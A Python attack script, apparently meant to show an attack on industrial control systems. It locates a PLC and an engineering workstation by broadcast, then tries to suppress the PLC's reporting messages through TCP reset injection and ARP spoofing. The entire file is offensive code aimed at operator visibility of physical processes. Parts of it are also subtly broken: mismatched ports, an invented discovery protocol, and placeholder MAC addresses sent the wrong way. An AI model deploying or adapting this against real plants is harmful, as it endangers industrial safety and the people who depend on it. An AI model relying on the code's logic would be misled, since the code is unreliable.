import socket
import struct
import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, ARP

# Define the PLC's IP address and port
plc_ip = None
plc_port = 102

# Define the engineering workstation's IP address and port
ew_ip = None
ew_port = 103

# Function to scan the network for the PLC's IP address
def find_plc_ip():
    global plc_ip
    # Send a broadcast message to the network to find the PLC
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(b"Hello, PLC!", ("255.255.255.255", plc_port))
    # Listen for a response from the PLC
    sock.settimeout(1)
    try:
        data, addr = sock.recvfrom(1024)
        plc_ip = addr[0]
        print(f"Found PLC at IP address {plc_ip}")
    except socket.timeout:
        print("No PLC found on the network")
    sock.close()

# Function to scan the network for the engineering workstation's IP address
def find_ew_ip():
    global ew_ip
    # Send a broadcast message to the network to find the engineering workstation
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(b"Hello, EW!", ("255.255.255.255", ew_port))
    # Listen for a response from the engineering workstation
    sock.settimeout(1)
    try:
        data, addr = sock.recvfrom(1024)
        ew_ip = addr[0]
        print(f"Found engineering workstation at IP address {ew_ip}")
    except socket.timeout:
        print("No engineering workstation found on the network")
    sock.close()

# Function to block reporting messages from reaching the engineering workstation
def block_reporting_messages():
    global plc_ip, ew_ip
    if plc_ip is not None and ew_ip is not None:
        # Create a packet sniffer to capture reporting messages
        packet_sniffer = scapy.sniff(filter=f"host {plc_ip} and port {plc_port} and dst {ew_ip}", count=100)
        # Iterate over the captured packets
        for packet in packet_sniffer:
            # Check if the packet is a reporting message
            if packet.haslayer(TCP) and packet[TCP].dport == ew_port:
                # Block the reporting message by sending a TCP RST packet
                tcp_rst_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="R")
                scapy.send(tcp_rst_packet, verbose=0)
                print(f"Blocked reporting message from {packet[IP].src} to {packet[IP].dst}")
    else:
        print("PLC or engineering workstation IP address not found")

# Function to implement ARP spoofing to block reporting messages
def arp_spoofing():
    global plc_ip, ew_ip
    if plc_ip is not None and ew_ip is not None:
        # Create an ARP spoofing packet
        arp_spoofing_packet = Ether(src="00:11:22:33:44:55", dst="00:66:77:88:99:00")/ARP(psrc="192.168.1.100", pdst=plc_ip, hwdst="00:66:77:88:99:00")
        # Send the ARP spoofing packet
        scapy.send(arp_spoofing_packet, verbose=0)
        print(f"Sent ARP spoofing packet to {plc_ip}")
    else:
        print("PLC or engineering workstation IP address not found")

# Main function
def main():
    find_plc_ip()
    find_ew_ip()
    block_reporting_messages()
    arp_spoofing()

if __name__ == "__main__":
    main()